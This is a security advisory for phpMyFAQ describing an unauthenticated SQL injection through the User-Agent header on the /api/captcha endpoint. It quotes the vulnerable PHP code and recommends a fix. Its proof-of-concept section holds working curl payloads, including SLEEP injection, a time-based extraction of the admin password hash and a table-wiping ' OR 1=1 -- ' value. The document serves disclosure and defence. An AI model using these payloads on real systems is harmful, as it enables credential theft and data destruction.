# [C] phpMyFAQ has unauthenticated SQL injection via User-Agent header in BuiltinCaptcha

## Summary
Severity: Critical
Advisory: GHSA-289f-fq7w-6q2w
CVE: CVE-2026-46364
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-289f-fq7w-6q2w
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.2
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.2

## Details
## Summary

`BuiltinCaptcha::garbageCollector()` and `BuiltinCaptcha::saveCaptcha()` at `phpmyfaq/src/phpMyFAQ/Captcha/BuiltinCaptcha.php:298` and `:330` interpolate the `User-Agent` header and client IP address into DELETE and INSERT queries with `sprintf` and no escaping. Both methods run on every hit to the public `GET /api/captcha` endpoint, which requires no authentication. An unauthenticated attacker sets the `User-Agent` header to a crafted SQL payload and runs `SLEEP()`, `BENCHMARK()`, or time-based blind extraction against the database that backs phpMyFAQ. Verified live against 4.2.0-alpha (master at `b9f25109`): baseline request 147 ms, request with `User-Agent: x' OR SLEEP(2) OR 'x` 4.09 s (two `SLEEP(2)` calls, one per vulnerable sink).

## Details

`phpmyfaq/src/phpMyFAQ/Captcha/BuiltinCaptcha.php:112` populates two private fields from untrusted HTTP input at construction time:

```php
$this->userAgent = $request->headers->get('user-agent');
$this->ip = $request->getClientIp();
```

Both fields are then dropped into `sprintf()` SQL templates without ever touching `Database::escape()` or a prepared statement.

`garbageCollector()` at line 298 (called on every captcha request via `getCaptchaImage()`):

```php
$delete = sprintf(
    "
    DELETE FROM
        %sfaqcaptcha
    WHERE
        useragent = '%s' AND language = '%s' AND ip = '%s'",
    Database::getTablePrefix(),
    $this->userAgent,                                      // unescaped
    $this->configuration->getLanguage()->getLanguage(),
    $this->ip,                                             // unescaped
);
$this->configuration->getDb()->query($delete);
```

`saveCaptcha()` at line 330 does the same for INSERT:

```php
$insert = sprintf(
    "INSERT INTO %sfaqcaptcha (id, useragent, language, ip, captcha_time) VALUES ('%s', '%s', '%s', '%s', %d)",
    Database::getTablePrefix(),
    $this->code,
    $this->userAgent,                                      // unescaped
    $this->configuration->getLanguage()->getLanguage(),
    $this->ip,                                             // unescaped
    $this->timestamp,
);
$this->configuration->getDb()->query($insert);
```

For comparison, the same file's `checkCaptchaCode()` at line 472 passes user input through `$db->escape()` before interpolation. The `BuiltinCaptcha` author knew about `escape()`; the two sinks above skip it.

### Reachability

`phpmyfaq/src/phpMyFAQ/Controller/Frontend/Api/CaptchaController.php:39` exposes the vulnerable flow as an unauthenticated GET:

```php
#[Route(path: 'captcha', name: 'api.private.captcha', methods: ['GET'])]
public function renderImage(): Response
{
    if (!$this->captcha instanceof BuiltinCaptcha) {
        return new Response('', Response::HTTP_NOT_FOUND);
    }
    // ...
    $response->setContent($this->captcha->getCaptchaImage());
    return $response;
}
```

`getCaptchaImage()` calls `saveCaptcha()` and `garbageCollector()` unconditionally. No CSRF token, session, or rate limit gates the request. Any unauthenticated user hitting `GET /api/captcha` injects into two queries at once.

### Impact surface

MySQL's `query()` method executes one statement per call, so the attacker cannot stack queries. Time-based blind extraction with `SLEEP()` or `BENCHMARK()` still works, and the attacker can:

- Read any row the web user has access to through bit-by-bit `IF(SUBSTR((SELECT ...),1,1)='a', SLEEP(1), 0)` chains. The `faquser` table holds `auth_source`, `login`, and bcrypt password hashes for every registered user; `faqconfig` holds the `main.phpMyFAQToken` admin token and SMTP credentials.
- `UPDATE` / `DELETE` arbitrary rows in the same connection's privilege scope using payloads that rewrite the DELETE's WHERE clause (for example, `User-Agent: ' OR 1=1 -- ` deletes the entire `faqcaptcha` table and locks out legitimate users).

## Proof of Concept

Tested against phpMyFAQ 4.2.0-alpha at master `b9f25109fddb38eee19987183798638d07943f92`, default install (MariaDB 10.6, Apache, PHP 8.4) on `http://target:8090`.

Step 1: Baseline request with a clean `User-Agent`:

```bash
time curl -sS -o /dev/null -w "HTTP %{http_code} %{time_total}s\n" \
  -A "Mozilla/5.0" \
  "http://target:8090/api/captcha?nocache=1"
# HTTP 500 0.147s
```

Step 2: Injection with `SLEEP(2)` in the User-Agent:

```bash
time curl -sS -o /dev/null -w "HTTP %{http_code} %{time_total}s\n" \
  -A "x' OR SLEEP(2) OR 'x" \
  "http://target:8090/api/captcha?nocache=2"
# HTTP 500 4.093s
```

The 4.09 s response time equals two `SLEEP(2)` executions, confirming the payload reached both the `DELETE` in `garbageCollector()` and the `INSERT` in `saveCaptcha()`.

Step 3: Single-bit boolean extraction using time:

```bash
# leaks first character of the admin hash; 2s = 'a', 0s = otherwise
curl -sS -o /dev/null -A "x' OR IF(SUBSTR((SELECT pass FROM faquser LIMIT 1),1,1)='a',SLEEP(2),0) OR 'x" \
  "http://target:8090/api/captcha?nocache=3"
```

Iterating position and character enables full credential exfiltration without any authentication.

## Impact

Unauthenticated remote SQL injection against the primary phpMyFAQ datastore. In a default install the attacker reads every user credential hash, the admin token, SMTP credentials stored in `faqconfig`, and every FAQ row (including ones marked private or permission-scoped). DELETE-path payloads also tamper with or wipe arbitrary rows in the connection's scope. There is no authentication, CSRF token, or rate limit in front of `/api/captcha`.

## Recommended Fix

Route both fields through `Database::escape()` before interpolation, or replace the `sprintf` + `query()` pattern with a prepared statement.

`phpmyfaq/src/phpMyFAQ/Captcha/BuiltinCaptcha.php:298-325`:

```php
$db = $this->configuration->getDb();
$userAgent = $db->escape($this->userAgent);
$language = $db->escape($this->configuration->getLanguage()->getLanguage());
$ip = $db->escape($this->ip);

$delete = sprintf(
    "DELETE FROM %sfaqcaptcha WHERE useragent = '%s' AND language = '%s' AND ip = '%s'",
    Database::getTablePrefix(),
    $userAgent,
    $language,
    $ip,
);
$db->query($delete);
```

Apply the same change to `saveCaptcha()` at line 330 and to every other `sprintf`-into-SQL path in the file. A targeted audit for `sprintf.*SQL|sprintf.*SELECT|sprintf.*INSERT|sprintf.*UPDATE|sprintf.*DELETE` across `src/phpMyFAQ/` will surface the rest.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-289f-fq7w-6q2w
- https://nvd.nist.gov/vuln/detail/CVE-2026-46364
- https://github.com/thorsten/phpMyFAQ/commit/b9f25109fddb38eee19987183798638d07943f92
- https://github.com/thorsten/phpMyFAQ
- https://www.vulncheck.com/advisories/phpmyfaq-sql-injection-via-user-agent-header-in-builtincaptcha
